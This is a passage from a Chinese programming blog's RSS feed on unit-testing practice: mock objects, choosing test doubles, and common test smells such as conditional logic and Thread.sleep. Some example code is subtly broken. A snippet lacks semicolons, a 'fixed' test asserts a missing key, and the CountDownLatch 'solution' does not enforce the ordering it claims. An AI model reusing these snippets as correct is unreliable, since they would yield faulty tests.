&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">isEngineFlg&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> engineFlg&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setEngineFlg&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">boolean&lt;/span> engineFlg&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">engineFlg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> engineFlg&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="模拟对象-mock">模拟对象 mock&lt;/h4>
&lt;p>模拟对象是在一个特定情境下可配置行为的对象。模拟对象时一种更加高级与特殊的测试间谍，它关注的重点是两个对象之间的交互行为。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">mockTest&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> Internet internet &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">mock&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Internet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">checking&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Expectations&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{{&lt;/span>
one&lt;span style="color:#f92672">(&lt;/span>internet&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>with&lt;span style="color:#f92672">(&lt;/span>containsString&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;langpair=en&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
will&lt;span style="color:#f92672">(&lt;/span>returnValue&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#f92672">}};&lt;/span>
Translator t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Translator&lt;span style="color:#f92672">(&lt;/span>internet&lt;span style="color:#f92672">);&lt;/span>
String translation &lt;span style="color:#f92672">=&lt;/span> t&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">translate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;flower&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>ENGLISH&lt;span style="color:#f92672">);&lt;/span>
assertEquals&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>translation&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过使用模拟对象的预测返回值行为，我们可以更加精确的对交互行为进行验证。&lt;/p>
&lt;h2 id="如何选择合适的替身类型">如何选择合适的替身类型&lt;/h2>
&lt;ul>
&lt;li>如果你测试的重点是交互，即两个对象之前的调用，你可能需要一个模拟对象 mock。&lt;/li>
&lt;li>如果你决定使用 Mock ，但测试代码最终看起来不像你想象的那么漂亮了，则考虑使用 Spy。&lt;/li>
&lt;li>如果你只关心协作对象向被测对象输送的响应，用 stub 解决问题。&lt;/li>
&lt;li>如果你运行的是一个复杂场景，其中它所依赖的服务无法供测试使用，但是你又需要这些服务提供的行为哪怕是一个简单的提示，那就应该考虑使用 Fake。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>《有效的单元测试》 &lt;em>Lasse Koskela&lt;/em>&lt;/p></description></item><item><title>单元测试的哲学</title><link>https://www.chucklin.net/post/testphilosophy/</link><pubDate>Mon, 27 Jan 2020 09:51:00 +0800</pubDate><guid>https://www.chucklin.net/post/testphilosophy/</guid><description>&lt;h2 id="审美之前先审丑">审美之前先审丑&lt;/h2>
&lt;p>单元测试的设计不是主观臆断凭直觉的产物。好的设计和工业设计一样，存在着公认的行为准则。
在学习优秀的单元测试设计之前，了解一下糟糕的设计是快速掌握设计诀窍的“捷径”。&lt;/p>
&lt;h2 id="单元测试的坏味道">单元测试的坏味道&lt;/h2>
&lt;h3 id="不可读的单元测试">不可读的单元测试&lt;/h3>
&lt;p>单元测试的可读性应该体现在程序员阅读测试代码之后，就该理解代码应当做什么。程序员运行那些测试时，就该了解代码实际上在做些什么。
避免基本断言。基本断言的含义隐藏在了复杂的代码背后。使用更加自然化的描述语言来表达你的断言。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">outputHasLineNumbers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
String content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1st match on 1&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
assertTrue&lt;span style="color:#f92672">(&lt;/span>content&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">indexOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 利用好 Hamcrest 匹配器，使用更加自然化的描述语言来编写测试
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">outputHasLineNumbers2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
String content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1st match on 1&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
assertThat&lt;span style="color:#f92672">(&lt;/span>content&lt;span style="color:#f92672">,&lt;/span> containsString&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="拥有条件逻辑的单元测试">拥有条件逻辑的单元测试&lt;/h3>
&lt;p>在测试中存在条件逻辑，一般都不是什么好事儿。你很难弄清楚究竟在测试什么。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">conditionTestDemo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Map&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> strMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
strMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
strMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> strEntry &lt;span style="color:#f92672">:&lt;/span> strMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">entrySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>strEntry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getKey&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
assertEquals&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> strEntry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>strEntry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getKey&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
assertEquals&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> strEntry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>条件逻辑会让本来需要被运行的断言操作因为轻微的改动，导致断言无法执行，让人误以为断言执行成功！
想想办法，对上面的测试加以改动使他更加的清晰和准确。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">conditionTestDemo2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
Map&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> strMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
strMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
strMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;b&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
assertContains&lt;span style="color:#f92672">(&lt;/span>strMap&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 判断 stringMap 是否包含期望的 key 与 value
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param stringMap strmap
&lt;/span>&lt;span style="color:#75715e"> * @param key 期望的 key
&lt;/span>&lt;span style="color:#75715e"> * @param value 期望的 value
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">assertContains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Map&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> stringMap&lt;span style="color:#f92672">,&lt;/span> String key&lt;span style="color:#f92672">,&lt;/span> String value&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Map&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Entry&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">,&lt;/span> String&lt;span style="color:#f92672">&amp;gt;&lt;/span> entry &lt;span style="color:#f92672">:&lt;/span> stringMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">entrySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>key&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>entry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getKey&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
assertEquals&lt;span style="color:#f92672">(&lt;/span>value&lt;span style="color:#f92672">,&lt;/span> entry&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getValue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
fail&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;stringMap 未包含期望的 key -&amp;gt; %s &amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> key&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>若所有的条件逻辑都没有执行时，记得一定要有一行 fail 使断言失败。&lt;/p>
&lt;h3 id="脆弱的单元测试">脆弱的单元测试&lt;/h3>
&lt;p>脆弱的测试往往都涉及了线程和静态条件或者依赖时间和平台的代码。或者访问一切 IO 的代码。避免代码涉及到日期等一切可变因素的影响。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Car&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 对外封闭的引擎对象。你无法知道内在信息。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> Engine engine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Car&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Engine engine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">engine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> engine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 需要测试的启动功能
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 需要测试汽车的驾驶功能
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">drive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Route route&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 根据路线状态获取提供给 car 使用的各种方向 (十分复杂的算法，初始化时需要涉及 gis 算法。最终获取的对对象与当前的时间有关）
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Directions directions &lt;span style="color:#f92672">:&lt;/span> route&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDirections&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
directions&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">follow&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>用于获取地图最佳距离算法的 Route 对象依赖与时间以及当前某条线路的交通状况。它很可能会返回你预料之外的结果。&lt;/p>
&lt;h3 id="运行缓慢的烦人测试">运行缓慢的烦人测试&lt;/h3>
&lt;h4 id="使用-sleep">使用 sleep&lt;/h4>
&lt;p>在测试代码在并发状态下的执行状况时，由于对测试结果的期待，或许会需要某些 Reduce 线程在 Map 线程之后才运行。最简单的方式是使用 Thread.sleep();&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">threadTestDemo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> InterruptedException &lt;span style="color:#f92672">{&lt;/span>
Runnable mapRunable &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;执行计算方法&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">};&lt;/span>
Runnable reduceRunable &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;收集计算结果&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">};&lt;/span>
Thread mapThread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>mapRunable&lt;span style="color:#f92672">);&lt;/span>
mapThread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 等待 map 函数结束
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>3000&lt;span style="color:#f92672">);&lt;/span>
Thread reduceThread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>reduceRunable&lt;span style="color:#f92672">);&lt;/span>
reduceThread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 等待 reduce 函数结束
&lt;/span>&lt;span style="color:#75715e">&lt;/span> Thread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sleep&lt;/span>&lt;span style="color:#f92672">(&lt;/span>3000&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>随着单元测试代码的日积月累，大量的 Thread.sleep 使测试速度越来越慢，单个本地测试也许还可以忍受，但全面自动化测试时乌龟一般的运行速度能让你抓狂。我猜你一定不想看到那一天。所以，现在开始想想办法，免去无意义的多余等待，尝试使用 CountDownLatch 来测试并发逻辑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">threadCountDownLautchDemo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> InterruptedException &lt;span style="color:#f92672">{&lt;/span>
CountDownLatch latch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> CountDownLatch&lt;span style="color:#f92672">(&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
Runnable mapRunable &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;执行计算方法&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
latch&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">countDown&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">};&lt;/span>
Runnable reduceRunable &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Runnable&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;收集计算结果&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
latch&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">await&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InterruptedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">};&lt;/span>
Thread mapThread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>mapRunable&lt;span style="color:#f92672">);&lt;/span>
mapThread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
Thread reduceThread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Thread&lt;span style="color:#f92672">(&lt;/span>reduceRunable&lt;span style="color:#f92672">);&lt;/span>
reduceThread&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="在测试中使用-io-以及打印日志">在测试中使用 IO 以及打印日志&lt;/h4>
&lt;p>IO 与日志也是 cpu 资源消耗大户。对于 IO 测试请使用替身来加快执行速度。而日志系统。。。。在测试运行环境中请关闭它吧！&lt;/p>
&lt;h3 id="永不失败的快乐测试">永不失败的快乐测试&lt;/h3>
&lt;p>促成快乐测试的原因往往有两点：&lt;/p>
